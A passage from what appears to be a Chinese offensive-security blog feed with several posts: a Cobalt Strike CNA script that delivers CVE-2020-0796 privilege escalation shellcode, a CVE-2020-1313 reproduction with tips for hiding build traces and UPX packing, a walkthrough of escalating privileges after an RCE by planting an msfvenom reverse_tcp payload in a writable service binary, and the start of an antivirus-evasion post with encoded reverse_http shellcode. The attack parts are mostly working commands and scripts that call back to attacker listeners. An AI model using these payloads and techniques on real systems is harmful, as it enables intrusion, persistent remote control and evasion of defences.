href="#0x02-CNA脚本编写" class="headerlink" title="0x02 CNA脚本编写"></a>0x02 CNA脚本编写</h2><p>CNA脚本是Cobalt Strike的插件脚本，用来给beacon下发各种指令增强Cobalt Strike的能力。<br>编写好的脚本如下，会将提权函数注册到beacon右键菜单-执行-提权中。函数会将上一步编译好的DLL反射进内存，然后传递shellcode执行：</p><pre class="line-numbers language-perl"><code class="language-perl"><span class="token function"><span class="token keyword">sub</span> CVE_2020_0796</span> <span class="token punctuation">{</span>    <span class="token keyword">local</span><span class="token punctuation">(</span><span class="token string">'$stager $arch $dll'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    btask<span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">,</span> <span class="token string">"Task Beacon to run "</span> <span class="token operator">.</span> listener_describe<span class="token punctuation">(</span><span class="token variable">$2</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string">" via CVE-2020-0796"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">#KB4551762</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">-</span>is64 <span class="token variable">$1</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$arch</span> <span class="token operator">=</span> <span class="token string">"x64"</span><span class="token punctuation">;</span>        <span class="token variable">$dll</span> <span class="token operator">=</span> getFileProper<span class="token punctuation">(</span>script_resource<span class="token punctuation">(</span><span class="token string">"modules"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"0796.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$stager</span> <span class="token operator">=</span> transform<span class="token punctuation">(</span>shellcode<span class="token punctuation">(</span><span class="token variable">$2</span><span class="token punctuation">,</span> false<span class="token punctuation">,</span> <span class="token variable">$arch</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         bdllspawn<span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">,</span> <span class="token variable">$dll</span><span class="token punctuation">,</span><span class="token variable">$stager</span><span class="token punctuation">,</span> <span class="token string">"Elevation of local privileges"</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token punctuation">}</span>beacon_exploit_register<span class="token punctuation">(</span><span class="token string">"CVE_2020_0796"</span><span class="token punctuation">,</span> <span class="token string">"CVE-2020-0796"</span><span class="token punctuation">,</span> <span class="token variable">&amp;CVE_2020_0796</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="0x03-提权测试"><a href="#0x03-提权测试" class="headerlink" title="0x03 提权测试"></a>0x03 提权测试</h2><p>测试之前需要做一下环境的准备工作，先到<a href="https://msdn.itellyou.cn/">MSDN itellyou</a>上下载一个<a href="ed2k://|file|cn_windows_10_business_editions_version_1909_x64_dvd_0ca83907.iso|5275090944|9BCD5FA6C8009E4D0260E4B23008BD47|/">1909的镜像</a>，在虚拟机中安装好后，进行以下设置：</p><ol><li>暂停Windows更新(很关键,自动更新虚拟机占用20%CPU,顺便还把漏洞修了…)</li><li>关闭windows Defender</li><li>添加一个普通用户(net user admin 123 /add)</li><li>完成后保存快照<br><img src="https://i.loli.net/2021/04/22/lqBr4pvfJaLSTR1.png"><br>切换到admin下，随便传个🐴上去执行：<br><img src="https://i.loli.net/2021/04/22/tO9Rb1ckAvru8yz.png"><br>成功提权到SYSTEM:<br><img src="https://i.loli.net/2021/04/22/xOUELmuWTSCyeBs.gif" alt="CVE-2020-0796-LPE"></li></ol><h2 id="0x04-提权原理"><a href="#0x04-提权原理" class="headerlink" title="0x04 提权原理"></a>0x04 提权原理</h2><p>利用漏洞整数溢出(1108*A)，覆盖返回地址指向_SEP_TOKEN_PRIVILEGES结构体，然后通过任意写更改token权限：<br><img src="https://i.loli.net/2021/04/22/uFHX5lao1ULgQ3I.png"><br>之后找到一个高权限进程进行shellcode注入，获取权限。</p><h2 id="0x05-问题整理"><a href="#0x05-问题整理" class="headerlink" title="0x05 问题整理"></a>0x05 问题整理</h2><ol><li>Shellcode大小计算<br>CNA脚本在利用反射DLL提权时，会给DLL传递shellcode参数，用的是这两个函数生成载荷：<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#shellcode">shellcode</a>和<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#stager">stager</a>，4.1可以用<a href="https://www.cobaltstrike.com/aggressor-script/functions.html#payload_local">payload_local</a>。</li></ol><pre class="line-numbers language-shell"><code class="language-shell">$data = shellcode("my listener", false, "x64");$data = stager("my listener", "x64");<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>在DLL代码中，拿到该shellcode后，会进行长度计算，然后分配内存写入。而对传入的shellcode进行计算无非两种方法，单目运算符sizeof()和函数strlen(const char* str)，在进行shellcode计算时会遇到00字节导致计算错误，导致注入的系统进程(如winlogo.exe)崩溃，造成系统注销或重启。实验通过以下几种方案来尝试获得shellcode大小：<br>方案1(失败):<br>先看这第一种直接传入shellcode二进制流的方法：<br>使用<code>$stager = shellcode($2, false, $arch);</code>来生成shellcode：<br><img src="https://i.loli.net/2021/04/22/Rpi7bPoetvjBrkY.png"><br>可以正常获取到shellcode，但是没有办法计算分配的内存大小。<br>方案2(成功)：<br>方案2是开发的插件采用的方法，在方案1中无论如何都无法获得正确的shellcode内存大小，这时想到之前利用http加载shellcode执行的方法，在程序中会接收字符串(ascll)形式的shellcode，然后再转为hex形式的c-shellcode进入内存执行。<br>如下的示例,只有第二组的shellcode进入内存才会被正确执行：<br><img src="https://i.loli.net/2021/04/22/ZmkRoY1fTpWL5K6.png"><br>方案1问题在于无法获得正确的shellcode长度，方案2那么就先让它获取长度，而传入字符串可以使用strlen来获取长度，所以使用<code>$stager = transform(shellcode($2, false, $arch),"hex");</code>来转换shellcode为hex编码的字符串：<br><img src="https://i.loli.net/2021/04/22/EK5f1znFp4ky3IR.png"><br> 现在长度获取到了，就需要将字符串的shellcode转换成c-shellcode进内存执行，进行转换的代码：<br> <img src="https://i.loli.net/2021/04/22/Sd2vbzxgWjsDaYC.png"><br> 经过转换后，可以发现出现了熟悉的“麳冧痂”，剩下的就是按照漏洞利用流程在进程内存开辟891的空间，然后写入shellcode了：<br> <img src="https://i.loli.net/2021/04/22/x479DlbpJzjoHRK.png"><br> 方案3(成功)：<br> 在前两个方案中，要么就是无法获取长度，要么就是得转换shellcode，为什么不能在cna脚本里传递参数的时候就把长度给DLL呢。这里可以看下metasploit-framework的实现方法(专业!)，安装了metasploit后可以在<code>metasploit-framework\embedded\framework\external\source\exploits\CVE-2020-0796</code>下查看到源码：<br> <img src="https://i.loli.net/2021/04/22/xwBRMyazk8v6hEZ.png"><br> metasploit是通过定义一个结构体，定义两种不同类型的参数：</p><pre class="line-numbers language-thrift"><code class="language-thrift"> typedef struct _MSF_PAYLOAD {    DWORD  dwSize;    CHAR  cPayloadData[];} MSF_PAYLOAD;typedef MSF_PAYLOAD* PMSF_PAYLOAD;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在cna脚本中传递过来的参数就为：</p><pre class="line-numbers language-shell"><code class="language-shell">$stager = shellcode($2, false, $arch);$stager = pack("I-", strlen($stager)) . $stager;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>执行结果可以看到正确获取大小和数据流：<br><img src="https://i.loli.net/2021/04/22/z5bvSsJoWVClycR.png"><br>更棒的是，metasploit的exp可以直接拿过来用，只需要编写cna脚本传递参数即可。<br><img src="https://i.loli.net/2021/04/22/Wsl15bqRNgyDaY3.png"></p><ol start="2"><li><p>导出函数名<br>在这里想尝试修改默认DLL的导出函数(去除特征ReflectiveLoader)：<br><img src="https://i.loli.net/2021/04/22/UsWv7omgKflXJEM.png"><br>修改完成后编译，使用dumpbin工具查看DLL导出函数：</p><pre class="line-numbers language-taggerscript"><code class="language-taggerscript">>"D:\Program Files (x86)\Microsoft Visual Studio\2019\Community\VC\Tools\MSVC\14.27.29110\bin\Hostx64\x64\dumpbin.exe" /exports reflective_dll.x64.dll<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2021/04/22/Us9ltDmnLVfobRN.png"><br>然后加载执行：<br><img src="https://i.loli.net/2021/04/22/wJx4LFIMBaWSm6p.png"><br>额….，那还是老实用ReflectiveLoader。</p></li><li><p>Beacon exit后进程崩溃<br><img src="https://i.loli.net/2021/04/22/COTzDYKIRbN6qwE.gif" alt="Exit"><br>考虑是shellcode的原因，就像在beacon.exe中退出一样，进程会直接退出，那么就需要一个可以创建线程的shellcode来实现分离。在手册中看到有一个shellcode生成函数：<br><img src="https://i.loli.net/2021/04/22/iRN86mYyxcl2hSf.png"><br>在cs4.0下报错，函数不存在:<br><img src="https://i.loli.net/2021/04/22/fjROk9tbyZwBFgQ.png"><br>使用cs4.1进行测试成功，exit后进程不崩溃：<br><img src="https://i.loli.net/2021/04/22/USb3cCIfxXF4Ta6.gif"><br>cna脚本如下：</p><pre class="line-numbers language-perl"><code class="language-perl"><span class="token comment" spellcheck="true">#cs4.1</span><span class="token function"><span class="token keyword">sub</span> CVE_2020_0796</span> <span class="token punctuation">{</span> <span class="token keyword">local</span><span class="token punctuation">(</span><span class="token string">'$stager'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token operator">-</span>is64 <span class="token variable">$1</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     berror<span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">,</span> <span class="token string">"cve-2020-0796 exploit is x64 only"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     return<span class="token punctuation">;</span> <span class="token punctuation">}</span> println<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> btask<span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">,</span> <span class="token string">"Task Beacon to run "</span> <span class="token operator">.</span> listener_describe<span class="token punctuation">(</span><span class="token variable">$2</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token string">" cve-2020-0796"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$stager</span> <span class="token operator">=</span> payload_local<span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">,</span> <span class="token variable">$2</span><span class="token punctuation">,</span> <span class="token string">"x64"</span><span class="token punctuation">,</span> <span class="token string">"thread"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$stager</span> <span class="token operator">=</span> pack<span class="token punctuation">(</span><span class="token string">"I-"</span><span class="token punctuation">,</span> strlen<span class="token punctuation">(</span><span class="token variable">$stager</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">.</span> <span class="token variable">$stager</span><span class="token punctuation">;</span> <span class="token variable">$dll</span> <span class="token operator">=</span> getFileProper<span class="token punctuation">(</span>script_resource<span class="token punctuation">(</span><span class="token string">"modules"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"reflective_dll.x64.dll"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  bdllspawn<span class="token operator">!</span><span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">,</span> getFileProper<span class="token punctuation">(</span>script_resource<span class="token punctuation">(</span><span class="token string">"modules"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"reflective_dll.x64.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token variable">$stager</span><span class="token punctuation">,</span> <span class="token string">"cve-2020-0796"</span><span class="token punctuation">,</span> <span class="token number">5000</span><span class="token punctuation">)</span><span class="token punctuation">;</span> beacon_link<span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">,</span> <span class="token variable">$null</span><span class="token punctuation">,</span> <span class="token variable">$3</span><span class="token punctuation">[</span><span class="token string">'listener'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>beacon_exploit_register<span class="token punctuation">(</span><span class="token string">"CVE_2020_0796"</span><span class="token punctuation">,</span> <span class="token string">"CVE-2020-0796"</span><span class="token punctuation">,</span> <span class="token variable">&amp;CVE_2020_0796</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>另外在4.1中普通权限获取的beacon信息中Build号(影响18362和18363)实际测试并不准确:</p></li></ol><pre class="line-numbers language-powershell"><code class="language-powershell"><span class="token comment" spellcheck="true">#输出beacon信息</span><span class="token keyword">foreach</span> <span class="token variable">$key</span> => <span class="token variable">$value</span> <span class="token punctuation">(</span>binfo<span class="token punctuation">(</span><span class="token variable">$1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        println<span class="token punctuation">(</span><span class="token string">"$[15]key <span class="token variable">$value</span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2021/04/22/DEsqGh5YbZoW24t.png"></p><h2 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h2><p><a href="https://bbs.pediy.com/thread-262027.htm">https://bbs.pediy.com/thread-262027.htm</a><br><a href="https://github.com/pandasec888/taowu-cobalt-strike">https://github.com/pandasec888/taowu-cobalt-strike</a><br><a href="https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0796">https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2020-0796</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 安全工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CVE-2020-0796 </tag>
            
            <tag> Cobalt Strike </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CVE-2020-1313复现</title>
      <link href="/2020/10/09/cve-2020-1313-fu-xian/"/>
      <url>/2020/10/09/cve-2020-1313-fu-xian/</url>
      
        <content type="html"><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><blockquote><p>CVE-ID:CVE-2020-1313</p><p>类型：本地提权</p><p>POC: <a href="https://github.com/irsl/CVE-2020-1313">https://github.com/irsl/CVE-2020-1313</a></p><p>原理：利用Windows Update Orchestrator Service (是一个DCOM服务9C695035-48D2-4229-8B73-4C70E756E519) 暴露的API方法无需认证来进行计划任务的设置，计划任务以SYSTEM权限执行，导致权限提升。</p><p>影响版本：<br>Windows 10 Version 1903 for 32-bit Systems<br>Windows 10 Version 1903 for ARM64-based Systems<br>Windows 10 Version 1903 for x64-based Systems<br>Windows 10 Version 1909 for 32-bit Systems<br>Windows 10 Version 1909 for ARM64-based Systems<br>Windows 10 Version 1909 for x64-based Systems<br>Windows 10 Version 2004 for 32-bit Systems<br>Windows 10 Version 2004 for ARM64-based Systems<br>Windows 10 Version 2004 for x64-based Systems<br>Windows Server, version 1903 (Server Core installation)<br>Windows Server, version 1909 (Server Core installation)<br>Windows Server, version 2004 (Server Core installation)</p></blockquote><h4 id="2-编译复现"><a href="#2-编译复现" class="headerlink" title="2. 编译复现"></a>2. 编译复现</h4><p> 拉取poc后直接编译成Debug版本后，在虚拟机中cmd执行发现没有反应，双击执行后报错(物理机正常执行，考虑是虚拟机中运行环境的原因):</p><p><img src="https://i.loli.net/2020/10/09/fChwuaHAze9I3xg.png" alt="缺失DLL"></p><p>搜索缺少的DLL后，看到文章(<a href="https://blog.csdn.net/so_geili/article/details/53009680">https://blog.csdn.net/so_geili/article/details/53009680</a> 和 <a href="https://www.cnblogs.com/xzabg/p/5875296.html),%E8%AF%B4%E6%98%AF%E7%BC%96%E8%AF%91%E7%9A%84%E5%8E%9F%E5%9B%A0%EF%BC%8C%E7%84%B6%E5%90%8Evs%E8%BF%9B%E8%A1%8C%E8%AE%BE%E7%BD%AE%E5%A6%82%E4%B8%8B%EF%BC%9A">https://www.cnblogs.com/xzabg/p/5875296.html),说是编译的原因，然后vs进行设置如下：</a></p><p><img src="https://i.loli.net/2020/10/09/V6KjMf8JYCZAUwr.png" alt="运行库设置"></p><p>在项目属性-C/C++-代码生成-运行库中将其设置为静态编译 /MTd ，编译成功后文件为849kb：<br><img src="https://i.loli.net/2020/10/09/koVfPg2RhBL9EYz.png" alt="执行"></p><p>随后放到虚拟机里执行成功，可以看到注册表中新增了一项，命令在之后的一段时间内会自动触发。<br>接下来试试将选项设置为 release，生成后大小13kb:<br><img src="https://i.loli.net/2020/10/09/BQ2uz8SaMoVWmC1.png" alt="release"><br>执行成功：<br><img src="https://i.loli.net/2020/10/09/1tIb6v3nMmXyxNU.png" alt="执行成功"><br>然后一段时间后会在C盘生成个命令执行的txt，实际利用可以用powershell等来执行其他反弹shell的操作~</p><h4 id="3-其他"><a href="#3-其他" class="headerlink" title="3. 其他"></a>3. 其他</h4><p>在编译过程中，遇到运行库的问题，将网上看到的在这里记录一下。</p><h5 id="1-运行库设置"><a href="#1-运行库设置" class="headerlink" title="1.运行库设置"></a>1.运行库设置</h5><blockquote><p>多线程(/MT)、多线程调试(/MTd)、多线程DLL(/MD)、多线程调试DLL(/MDd)、单线程(/ML)、单线程调试(/MLd)，带D的是Debug模式，单线程运行时库选项/ML和/MLd在VS2003以后就取消了。<br>/MT 、 /MTd：<br>/MT和/MTd表示采用多线程CRT库的静态lib版本。该选项会在编译时将运行时库以静态lib的形式完全嵌入。该选项生成的可执行文件运行时不需要运行时库dll的参加，会获得轻微的性能提升，但最终生成的二进制代码因链入庞大的运行时库实现而变得非常臃肿。当某项目以静态链接库的形式嵌入到多个项目，则可能造成运行时库的内存管理有多份，最终将导致致命的“Invalid Address specified to RtlValidateHeap”问题。另外托管C++和CLI中不再支持/MT和/MTd选项。</p><p>/MD、/MDd：<br>/MD和/MDd表示采用多线程CRT库的动态dll版本，会使应用程序使用运行时库特定版本的多线程DLL。链接时将按照传统VC链接dll的方式将运行时库MSVCRxx.DLL的导入库MSVCRT.lib链接，在运行时要求安装了相应版本的VC运行时库可再发行组件包（当然把这些运行时库dll放在应用程序目录下也是可以的）。 因/MD和/MDd方式不会将运行时库链接到可执行文件内部，可有效减少可执行文件尺寸。当多项目以MD方式运作时，其内部会采用同一个堆，内存管理将被简化，跨模块内存管理问题也能得到缓解。</p></blockquote><h5 id="2-调试信息的隐藏"><a href="#2-调试信息的隐藏" class="headerlink" title="2.调试信息的隐藏"></a>2.调试信息的隐藏</h5><p>编译为可执行文件后，用16进制查看发现存在一些路径信息、printf的信息:<br><img src="https://i.loli.net/2020/10/09/xSUBOYdIzgMT7Xf.png" alt="路径信息"></p><p><img src="https://i.loli.net/2020/10/09/nbUVfdHhmwxWJpK.png" alt="printf的信息"></p><p>解决方法：<br>在属性链接器-调试中关闭调试信息：</p><p><img src="https://i.loli.net/2020/10/09/pHEgo97U3Xr4byD.png" alt="关闭调试信息生成"></p><p>然后捏，还可以用UPX 压缩一下文件 upx -9 xx.exe,从13kb压缩到9kb了。</p><h4 id="4-参考"><a href="#4-参考" class="headerlink" title="4. 参考"></a>4. 参考</h4><p><a href="https://www.freebuf.com/vuls/245706.html">https://www.freebuf.com/vuls/245706.html</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 漏洞复现 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 权限提升 </tag>
            
            <tag> Windows 10 </tag>
            
            <tag> CVE-2020-1313 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记一次简单的win提权</title>
      <link href="/2020/09/06/ji-yi-ci-jian-dan-de-win-ti-quan/"/>
      <url>/2020/09/06/ji-yi-ci-jian-dan-de-win-ti-quan/</url>
      
        <content type="html"><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><p> 在一次测试中，通过rce漏洞获得了目标主机meterpreter会话，尝试进行一些提权实验。过程中两台机子都不通外网，本文记录一下获得会话并提权过程。 </p><h4 id="2-获取msf会话"><a href="#2-获取msf会话" class="headerlink" title="2. 获取msf会话"></a>2. 获取msf会话</h4><p>生成一个exe载荷,看情况免杀：</p><pre class="line-numbers language-shell"><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.135 LPORT=443 -f exe -o 666.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在准备让目标机执行我们的载荷前，先使用脚本(通过msfpc来生成)来快速监听会话，并进行一些自动进程迁移的工作：</p><pre class="line-numbers language-shell"><code class="language-shell">msfconsole -q -r '/home/yanghao/windows-meterpreter-staged-reverse-tcp-443-exe.rc'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>脚本内容如下：</p><pre class="line-numbers language-shell"><code class="language-shell">use exploit/multi/handlerset PAYLOAD windows/meterpreter/reverse_tcpset LHOST 192.168.122.135set LPORT 443set ExitOnSession falseset EnableStageEncoding trueset EnableUnicodeEncoding trueset AutoRunScript 'post/windows/manage/migrate' run -j<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>参数的具体含义可以在设置了payload后执行show advanced查看:<br><img src="https://i.loli.net/2020/09/06/5v9ztK1OHNwClrm.png"><br>开始监听：<br><img src="https://i.loli.net/2020/09/06/EUw2GiQyRmSAg5L.png"><br>在目标机上执行生成的exe,获取会话：<br><img src="https://i.loli.net/2020/09/06/CpsugnLKoOMDT42.png"></p><h4 id="3-尝试提权"><a href="#3-尝试提权" class="headerlink" title="3. 尝试提权"></a>3. 尝试提权</h4><p>看了下目标已经是管理员权限了，如果要抓密码的话，得拿到system，准备试试。先ps看一下进程，发现有杀软，不过没关系，没有外网战力-50%:<br><img src="https://i.loli.net/2020/09/06/jKAURZu2DYNGSzV.png"><br>假装getsystem一下，whoami /priv 查看一下权限：<br><img src="https://i.loli.net/2020/09/06/2rCwVAfFNESi3hb.png" alt="getsystem"></p><p><img src="https://i.loli.net/2020/09/06/9eFRZGuTcUXVqAm.png" alt="whoami /priv"></p><h5 id="local-exploit-suggester模块失败"><a href="#local-exploit-suggester模块失败" class="headerlink" title="local_exploit_suggester模块失败"></a>local_exploit_suggester模块失败</h5><p>试试自带的模块来检查提权漏洞：</p><pre class="line-numbers language-shell"><code class="language-shell">use post/multi/recon/local_exploit_suggester<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/09/06/oBGYQmOS76RuW3b.png" alt="local_exploit_suggester"><br>发现有了一些漏洞，然后就加载对应的利用模块来进行尝试：<br><img src="https://i.loli.net/2020/09/06/gXSiGskL4K1hYaC.png" alt="失败1"></p><p><img src="https://i.loli.net/2020/09/06/RqOQy21rmzaC79v.png" alt="失败2"></p><p><img src="https://i.loli.net/2020/09/06/b6kiR7uDV5Y3QcJ.png" alt="失败3"></p><h5 id="柳暗花明-enum-services利用"><a href="#柳暗花明-enum-services利用" class="headerlink" title="柳暗花明(enum_services利用)"></a>柳暗花明(enum_services利用)</h5><p>差不多模块都试了一下，因为有杀软的原因，都失败了。这时候想着找点新的exp来用用，但是网络不太方便，就先看看主机上的情况，先看了下主机上启动的服务情况：</p><pre class="line-numbers language-shell"><code class="language-shell">use post/windows/gather/enum_services<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/09/06/vCjN63hxmKEnL9l.png" alt="查看服务"><br>发现了一个在D盘的服务(wpscloudsvr LocalSystem  “D:\Program Files\WPS Office\wpscloudsvr.exe” LocalService)：<br><img src="https://i.loli.net/2020/09/06/hdliZFzBrOeIA75.png" alt="wpscloudsvr.exe"><br>这里我们知道， 在C盘Windows,Program Files等目录下的文件都会被系统权限保护，而这个wpscloudsvr服务的可执行文件放在了D盘(这也是个很正常的事，总不能啥软件都往C盘装吧)，如果软件开发过程中未对这种类似服务的文件进行权限限制同时任意用户可以对其服务进行重启动，那么就可以利用替换该服务文件的方法来获得权限提升。接下来通过<code> cacls wpscloudsvr.exe</code> 查看文件权限，发现权限设置不当，标准用户可以对其更改(图找不到了，大概结果就像下面这样)，同时发现可以直接使用net命令来启动和停止其服务：<br><img src="https://i.loli.net/2020/09/06/pMJYBTNtlm3AfPq.png" alt="NT AUTHORITY\Authenticated Users:C"></p><p>现在条件都满足了，生成个马给这个文件替换了，重新启动服务不就完成提权了吗？快速操作中…<br>1、使用msfvenom生成一个exe-service类型的载荷：</p><pre class="line-numbers language-shell"><code class="language-shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.122.135 LPORT=8522 -f exe-service -o wpscloudsvr.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://i.loli.net/2020/09/06/MYqaP8yu9nQf7XZ.png" alt="exe-service"><br>2、上传并启动服务,并获得了会话:</p><pre class="line-numbers language-shell"><code class="language-shell">uplaod /xx/xx/wpscloudsvr.exe "D:\\Program Files\\WPS Office\\wpscloudsvr.exe"shell>net start wpscloudsvr<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://i.loli.net/2020/09/06/kwdlUENItnpOHJ8.png"><br>这里就拿到了system权限的会话了：<br><img src="https://i.loli.net/2020/09/06/meE4iFVNKJnOBHf.png"></p><p><img src="https://i.loli.net/2020/09/06/dj4W8KmTiaMIEtl.png"><br>后面就是上远程桌面看看，加个管理员账户什么的：<br><img src="https://i.loli.net/2020/09/06/orWRgGIUk7ZubB1.png"></p><p><img src="https://i.loli.net/2020/09/06/6omMlNKGb3QZUz2.png"></p><h4 id="4-总结"><a href="#4-总结" class="headerlink" title="4. 总结"></a>4. 总结</h4><p>1、使用metasploit脚本进行自动化设置<br>2、metasploit本地提权漏洞扫描、利用，相关信息收集模块使用；<br>3、服务可执行文件权限设置不当的cacls检查、exe-service载荷生成、替换执行提权。</p><h4 id="5-参考"><a href="#5-参考" class="headerlink" title="5. 参考"></a>5. 参考</h4><p><a href="https://blog.csdn.net/l1028386804/article/details/86669614">https://blog.csdn.net/l1028386804/article/details/86669614</a></p><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows服务提权 </tag>
            
            <tag> metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>简单的源码免杀</title>
      <link href="/2020/08/30/jian-dan-de-yuan-ma-mian-sha/"/>
      <url>/2020/08/30/jian-dan-de-yuan-ma-mian-sha/</url>
      
        <content type="html"><![CDATA[<h4 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h4><p> 经常看到各种免杀的例子，源码免杀、二进制免杀、加载器免杀等等，最近学习了一下源码层面的免杀，在实验过程中与杀软对抗最终成功免杀，写下本文做个记录。 </p><h4 id="2-shellcode生成和二进制文件编译"><a href="#2-shellcode生成和二进制文件编译" class="headerlink" title="2. shellcode生成和二进制文件编译"></a>2. shellcode生成和二进制文件编译</h4><p>   开始前有个小插曲，用360扫了扫之前编译的样本，当时v站查杀率1/72(提交到v站后cs一共上线了107台主机，emm)：<br> <img src="https://i.loli.net/2020/08/30/vF6ufsto52GzQ4c.png" alt="virus"><br> 今天扫描的时候：<br> <img src="https://i.loli.net/2020/08/30/jmkJoFchbgOls9a.png" alt="-查杀结果-"><br> 啊… Q哒不妞Q(Qwq)<br> <img src="https://i.loli.net/2020/08/30/pxslvIq4YmhzaWL.jpg"></p><p>好了不说了，进入正题，首先我们使用msfvenom生成C语言shellcode:</p><pre class="line-numbers language-c"><code class="language-c">msfvenom <span class="token operator">-</span>a x86 <span class="token operator">--</span>platform windows <span class="token operator">-</span>p windows<span class="token operator">/</span>meterpreter<span class="token operator">/</span>reverse_http <span class="token operator">-</span>e x86<span class="token operator">/</span>shikata_ga_nai <span class="token operator">-</span>i <span class="token number">12</span> <span class="token operator">-</span>b <span class="token string">'\x00'</span> LHOST<span class="token operator">=</span><span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">8.102</span> LPORT<span class="token operator">=</span><span class="token number">6666</span> <span class="token operator">-</span>f c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img 